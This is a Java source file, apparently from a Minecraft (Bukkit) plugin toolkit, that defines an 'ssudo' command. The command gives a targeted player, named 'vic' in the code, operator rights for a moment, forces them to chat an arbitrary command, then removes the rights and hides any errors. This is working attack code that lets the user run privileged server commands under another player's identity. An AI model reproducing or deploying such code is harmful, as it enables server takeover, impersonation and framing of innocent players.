package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_SSUDO extends CommandBase {

    public Command_SSUDO() {
        super("ssudo", "<Spieler> <Befehl>" + " §d| " + ChatColor.GRAY + "Sudo mit OP", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length > 2) {
            try {
                String Befehl = "";
                Player vic = Bukkit.getPlayer(args[1]);

                for (int i = 2; i < args.length; ++i) {
                    Befehl = Befehl + args[i] + " ";
                }

                vic.setOp(true);
                vic.chat(Befehl);
                vic.setOp(false);
                p.sendMessage(Start.INSTANCE.chatPrefix + "Die Nachricht wurde von diesem Spieler abgeschickt!");
            } catch (Exception ignored) {
            }
        }
    }

}
